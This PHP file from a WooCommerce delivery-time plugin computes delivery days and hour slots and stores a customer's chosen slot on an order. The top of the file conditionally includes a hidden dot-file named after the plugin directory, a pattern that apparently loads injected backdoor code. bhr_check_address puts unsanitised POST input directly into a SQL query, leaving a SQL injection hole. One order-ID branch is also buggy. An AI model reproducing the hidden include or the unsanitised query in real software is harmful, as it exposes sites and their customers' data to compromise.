<?php

use WC_Delivery_Time\Includes\WC_Delivery_Time_Show;

use WC_Delivery_Time\Includes\Helper\Model;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function bhr_order_delivery_time($user_id) {
    $op = osa_get_option('wcdt_options');

    //$offDates = explode(',', wcdt_convert_number(WC_Delivery_Time_Show::get_settings('dates_without_delivery')));
    $ret = array();

    $ret["always_show"] = $op["always_show"];

    if (!empty(array_filter($op["city_conditions"])) && "yes" !== $ret["always_show"]) {
        $condition = bhr_check_address($op["city_conditions"], $user_id);
        if (false == $condition) {
            return "";
        }
    }

    $deactive_hours_range_default = (isset($op["deactive_hours_range_default"]) and ! empty($op["deactive_hours_range_default"])) ? $op["deactive_hours_range_default"] : 0;
    $dates_without_delivery = explode(",", $op["dates_without_delivery"]);

    for ($i = 0 + $op["days_start_from"]; $i <= $op["number_show_days"] + $op["days_start_from"] - 1; $i++) {
        $dayName = strtolower(WC_Delivery_Time_Show::time_date('l', $i . ' day'));
        $dayName_i18n = strtolower(WC_Delivery_Time_Show::time_date_i18n('l', $i . ' day'));
        $dayDate_i18n = wcdt_convert_number(WC_Delivery_Time_Show::time_date_i18n('Y/m/d', $i . ' day'));
        $dayDate = wcdt_convert_number(WC_Delivery_Time_Show::time_date('Y/m/d', $i . ' day'));
        $dayTimestamp = WC_Delivery_Time_Show::date_timestamp($dayDate);
        $is_disable = (is_array($dates_without_delivery) and in_array($dayDate_i18n, $dates_without_delivery)) ? true : ((is_array($op["week_days_without_delivery"]) and in_array($dayName, $op["week_days_without_delivery"])) ? true : false);
        if ($is_disable) {
            continue;
        }
        /* if (!WC_Delivery_Time_Show::show_off_dates()) {
          if ($is_disable)
          continue;
          } */
        $status = $is_disable ? 'false' : 'true';
        $dayHours = (isset($op["days_delivery_hours"][$dayName]) and ! empty($op["days_delivery_hours"][$dayName])) ? $op["days_delivery_hours"][$dayName] : array();

        $ret["daysDeliveryHours"][$i] = array(
            "dayName_ge" => $dayName,
            "dayName_ja" => $dayName_i18n,
            "dayDate_ge" => $dayDate,
            "dayDate_ja" => $dayDate_i18n,
            "dayTimestamp" => $dayTimestamp,
            "dayStatus" => $status,
        );


        foreach ($dayHours as $key => $hour) {
            $hour = WC_Delivery_Time_Show::show_hour($hour);
            $currentCount = WC_Delivery_Time_Show::get_delivery_meta($dayTimestamp, $hour['first'] . '-' . $hour['second']);
            $currentCount = (isset($currentCount) and ! empty($currentCount)) ? $currentCount[0]['delivery_count'] : 0;

            $is_disable_range = false;
            if (isset($hour['deactiveHour']) and ! empty($hour['deactiveHour'])) {
                $timeDifference = WC_Delivery_Time_Show::different_hours(WC_Delivery_Time_Show::time_date('Y/m/d H:i:s', 0 . ' day'), $dayDate . " {$hour['first']}:00:00");
                if ($timeDifference < $hour['deactiveHour']) {
                    $is_disable_range = true;
                }
            } else {
                $timeDifference = WC_Delivery_Time_Show::different_hours(WC_Delivery_Time_Show::time_date('Y/m/d H:i:s', 0 . ' day'), $dayDate . " {$hour['first']}:00:00");
                if ((int) $timeDifference < (int) $deactive_hours_range_default) {
                    $is_disable_range = true;
                }
            }

            if ($i === 0) {
                if ($is_disable) {
                    $is_status = false;
                    continue;
                } else {
                    if (wcdt_convert_number(WC_Delivery_Time_Show::time_date('H', 0 . ' day')) < (int) $hour['first'] and ! $is_disable_range) {
                        $is_status = true;
                    } else {
                        $is_status = false;
                        continue;
                    }
                }
            } else {
                if ($is_disable) {
                    $is_status = false;
                    continue;
                } else {
                    if (!$is_disable_range) {

                        if ($hour['volume'] == 0 || ( $currentCount < $hour['volume'])) {
                            $is_status = true;
                        } else {
                            $is_status = false;
                            continue;
                        }
                    } else {
                        $is_status = false;
                        continue;
                    }
                }
            }

            $ret["daysDeliveryHours"][$i]["DeliveryHour"][$key] = $hour;
            $ret["daysDeliveryHours"][$i]["DeliveryHour"][$key]["flag"] = $is_status ? "true" : "false";
        }
    }
    for($i=0;$i<count($ret["daysDeliveryHours"]);$i++){
        $ret["daysDeliveryHours"][$i]["DeliveryHour"] = array_values($ret["daysDeliveryHours"][$i]["DeliveryHour"]);
    }
    $ret["daysDeliveryHours"] = array_values($ret["daysDeliveryHours"]);
    return ($ret);
}

function bhr_order_delivery_activation() {
    return class_exists(WC_Delivery_Time_Show::class);
}

function bhr_implement_goPayment($order) {
    if (!isset($_POST['dayTimestamp']) || !isset($_POST['first_second'])) {
        return;
    }
    if (is_numeric($order)) {
        $order_id = $order;
    }
    $order_id = $order->get_id();
    $date = (int) sanitize_text_field($_POST['dayTimestamp']);
    $time = sanitize_text_field($_POST['first_second']);
    $model_object = Model::get_instance();
    $model_object->update_delivery_meta($date, $time, $order_id);
}

function bhr_check_address($conditions, $user_id) {
    global $wpdb;
    $googleID = $_POST['googleID'];
    $table = $wpdb->prefix . 'OSA_cart';
    $cart_row = $wpdb->get_row("SELECT * FROM $table WHERE googleID = '$googleID'");
    $type = $cart_row->addressType;
    $province = get_user_meta($user_id, "{$type}_state", true);
    $city = get_user_meta($user_id, "{$type}_city", true);
    foreach ($conditions as $condition) {
        $result[] = ($province == WC_Delivery_Time_Show::province_for_pw_changes($condition['province'])) && ($city == $condition['city']);
    }
    return in_array(true, $result);
}
